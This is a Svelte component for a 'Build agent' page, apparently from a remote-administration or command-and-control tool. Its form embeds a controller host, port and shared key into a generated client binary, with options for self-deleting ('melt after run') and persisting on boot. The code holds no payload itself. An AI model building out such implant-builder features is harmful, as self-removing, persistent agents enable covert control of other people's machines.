<script lang="ts">
        import { Button } from '$lib/components/ui/button/index.js';
        import {
                Card,
                CardContent,
                CardDescription,
                CardFooter,
                CardHeader,
                CardTitle
        } from '$lib/components/ui/card/index.js';
        import { Input } from '$lib/components/ui/input/index.js';
        import { Label } from '$lib/components/ui/label/index.js';
        import { Progress } from '$lib/components/ui/progress/index.js';
        import { Switch } from '$lib/components/ui/switch/index.js';
        import { TriangleAlert, CircleCheck, Info } from '@lucide/svelte';

	type BuildStatus = 'idle' | 'running' | 'success' | 'error';

	type BuildResponse = {
		success: boolean;
		message?: string;
		downloadUrl?: string;
		outputPath?: string;
		log?: string[];
	};

	let host = $state('localhost');
	let port = $state('3000');
	let outputFilename = $state('tenvy-client');
	let installationPath = $state('');
	let encryptionKey = $state('');
	let meltAfterRun = $state(false);
	let startupOnBoot = $state(false);

	let buildStatus = $state<BuildStatus>('idle');
	let buildProgress = $state(0);
	let buildError = $state<string | null>(null);
	let downloadUrl = $state<string | null>(null);
	let outputPath = $state<string | null>(null);
	let buildLog = $state<string[]>([]);

	let progressMessages = $state<{ id: number; text: string; tone: 'info' | 'success' | 'error' }[]>([]);
	let nextMessageId = $state(0);

	let isBuilding = $derived(buildStatus === 'running');
        
        function resetProgress() {
                buildStatus = 'idle';
                buildProgress = 0;
                buildError = null;
                downloadUrl = null;
                outputPath = null;
                buildLog = [];
                progressMessages = [];
        }

        function pushProgress(text: string, tone: 'info' | 'success' | 'error' = 'info') {
                progressMessages = [
                        ...progressMessages,
                        {
                                id: nextMessageId++,
                                text,
                                tone
                        }
                ];
        }

        async function buildAgent() {
                if (buildStatus === 'running') {
                        return;
                }

                resetProgress();

                const trimmedHost = host.trim();
                const trimmedPort = port.trim();
                if (!trimmedHost) {
                        buildError = 'Host is required.';
                        pushProgress(buildError, 'error');
                        buildStatus = 'error';
                        buildProgress = 100;
                        return;
                }
                if (trimmedPort && !/^\d+$/.test(trimmedPort)) {
                        buildError = 'Port must be numeric.';
                        pushProgress(buildError, 'error');
                        buildStatus = 'error';
                        buildProgress = 100;
                        return;
                }

                buildStatus = 'running';
                buildProgress = 5;
                pushProgress('Preparing build request...');

                const payload = {
                        host: trimmedHost,
                        port: trimmedPort || '3000',
                        outputFilename: outputFilename.trim() || 'tenvy-client',
                        installationPath: installationPath.trim(),
                        encryptionKey: encryptionKey.trim(),
                        meltAfterRun,
                        startupOnBoot
                };

                try {
                        pushProgress('Dispatching build to compiler environment...');
                        buildProgress = 20;
                        const response = await fetch('/api/build', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(payload)
                        });

                        const result = (await response.json()) as BuildResponse;
                        buildLog = result.log ?? [];

                        if (!response.ok || !result.success) {
                                const message = result.message || 'Failed to build agent.';
                                throw new Error(message);
                        }

                        buildProgress = 65;
                        pushProgress('Compilation completed. Finalizing artifacts...');

                        downloadUrl = result.downloadUrl ?? null;
                        outputPath = result.outputPath ?? null;

                        buildProgress = 100;
                        buildStatus = 'success';
                        pushProgress('Agent binary is ready.', 'success');
                } catch (err) {
                        buildProgress = 100;
                        buildStatus = 'error';
                        buildError = err instanceof Error ? err.message : 'Unknown build error.';
                        pushProgress(buildError, 'error');
                }
        }

        function messageToneClasses(tone: 'info' | 'success' | 'error') {
                if (tone === 'success') return 'text-emerald-500';
                if (tone === 'error') return 'text-red-500';
                return 'text-muted-foreground';
        }

        function toneIcon(tone: 'info' | 'success' | 'error') {
                if (tone === 'success') return CircleCheck;
                if (tone === 'error') return TriangleAlert;
                return Info;
        }
</script>

<div class="mx-auto max-w-4xl">
        <Card>
                <CardHeader>
                        <CardTitle>Build agent</CardTitle>
                        <CardDescription>
                                Configure connection and persistence options, then generate a customized client binary.
                        </CardDescription>
                </CardHeader>
                <CardContent class="space-y-8">
                        <div class="grid gap-6 md:grid-cols-2">
                                <div class="grid gap-2">
                                        <Label for="host">Host</Label>
                                        <Input id="host" placeholder="controller.tenvy.local" bind:value={host} />
                                </div>
                                <div class="grid gap-2">
                                        <Label for="port">Port</Label>
                                        <Input id="port" placeholder="3000" bind:value={port} inputmode="numeric" />
                                </div>
                                <div class="grid gap-2">
                                        <Label for="output">Output filename</Label>
                                        <Input id="output" placeholder="tenvy-client" bind:value={outputFilename} />
                                </div>
                                <div class="grid gap-2">
                                        <Label for="path">Installation path</Label>
                                        <Input id="path" placeholder="/usr/local/bin/tenvy" bind:value={installationPath} />
                                </div>
                                <div class="md:col-span-2 grid gap-2">
                                        <Label for="encryption">Encryption key</Label>
                                        <Input
                                                id="encryption"
                                                placeholder="Shared secret used for authentication"
                                                bind:value={encryptionKey}
                                        />
                                </div>
                        </div>

                        <div class="grid gap-6 md:grid-cols-2">
                                <div class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4">
                                        <div>
                                                <p class="text-sm font-medium">Melt after run</p>
                                                <p class="text-xs text-muted-foreground">
                                                        Remove the staging binary after installation completes.
                                                </p>
                                        </div>
                                        <Switch
                                                bind:checked={meltAfterRun}
                                                aria-label="Toggle whether the temporary binary deletes itself"
                                        />
                                </div>
                                <div class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4">
                                        <div>
                                                <p class="text-sm font-medium">Startup on boot</p>
                                                <p class="text-xs text-muted-foreground">
                                                        Persist the agent path so it can be launched automatically on boot.
                                                </p>
                                        </div>
                                        <Switch
                                                bind:checked={startupOnBoot}
                                                aria-label="Toggle startup persistence preference"
                                        />
                                </div>
                        </div>

                        {#if buildStatus !== 'idle'}
                                <div class="space-y-4 rounded-lg border border-dashed border-border/70 p-4">
                                        <div class="space-y-2">
                                                <div class="flex items-center justify-between text-sm">
                                                        <span class="font-medium">Build progress</span>
                                                        <span>{buildProgress}%</span>
                                                </div>
                                                <Progress value={buildProgress} max={100} class="h-2" />
                                        </div>
                                        <ul class="space-y-2 text-sm">
                                                {#each progressMessages as message (message.id)}
                                                        {#if message}
                                                                {@const Icon = toneIcon(message.tone)}
                                                                <li class={`flex items-start gap-2 ${messageToneClasses(message.tone)}`}>
                                                                        <Icon class="mt-0.5 h-4 w-4" />
                                                                        <span class="text-left">{message.text}</span>
                                                                </li>
                                                        {/if}
                                                {/each}
                                        </ul>
                                        {#if downloadUrl || outputPath}
                                                <div class="rounded-md bg-muted/50 p-3 text-xs">
                                                        {#if downloadUrl}
                                                                <p>
                                                                        Download: <a class="font-medium text-primary underline" href={downloadUrl} download>agent binary</a>
                                                                </p>
                                                        {/if}
                                                        {#if outputPath}
                                                                <p class="mt-1 break-words text-muted-foreground">Saved to {outputPath}</p>
                                                        {/if}
                                                </div>
                                        {/if}
                                        {#if buildLog.length}
                                                <div>
                                                        <p class="text-xs font-semibold uppercase tracking-wide text-muted-foreground">Build log</p>
                                                        <pre class="mt-2 max-h-48 overflow-auto rounded-md bg-muted/40 p-3 text-xs font-mono">
                                                                {buildLog.join('\n')}
                                                        </pre>
                                                </div>
                                        {/if}
                                </div>
                        {/if}
                </CardContent>
                <CardFooter class="justify-between gap-4">
                        <div class="text-xs text-muted-foreground">
                                Provide a host and port to embed defaults inside the generated binary. Additional preferences are stored
                                for the agent to consume on first launch.
                        </div>
                        <Button type="button" disabled={isBuilding} onclick={buildAgent}>
                                {isBuilding ? 'Building…' : 'Build Agent'}
                        </Button>
                </CardFooter>
        </Card>
</div>
